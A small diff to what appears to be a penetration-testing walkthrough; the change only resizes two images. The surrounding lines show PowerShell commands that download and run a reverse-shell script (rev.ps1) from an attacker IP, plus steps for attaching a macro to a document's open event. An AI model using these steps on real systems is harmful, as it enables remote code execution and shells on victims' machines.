@@ -91,11 +91,12 @@ Enter These commands:
 cmd /c powershell iwr http://<your ip>/rev.ps1 - o C:/Windows/Tasks/rev.ps1
 cmd /c powershell -c C:/Windows/Tasks/rev.ps1
 ````
-![image](https://user-images.githubusercontent.com/127046919/224577261-f668cf22-eeda-4834-afe1-72eb34da07ef.png)
+<img src="https://user-images.githubusercontent.com/127046919/224577261-f668cf22-eeda-4834-afe1-72eb34da07ef.png" width="250" height="240" />
 ````
 tools > organize > Events > Open Document > Macro > (find your macro and attach it)
 ````
-![image](https://user-images.githubusercontent.com/127046919/224577298-3aaaf97f-e340-4ef8-a593-b24168ee8cd2.png)
+<img src="https://user-images.githubusercontent.com/127046919/224577298-3aaaf97f-e340-4ef8-a593-b24168ee8cd2.png" width="250" height="240" />
+
 ````
 vim rev.ps1
 chmod 755 rev.ps1
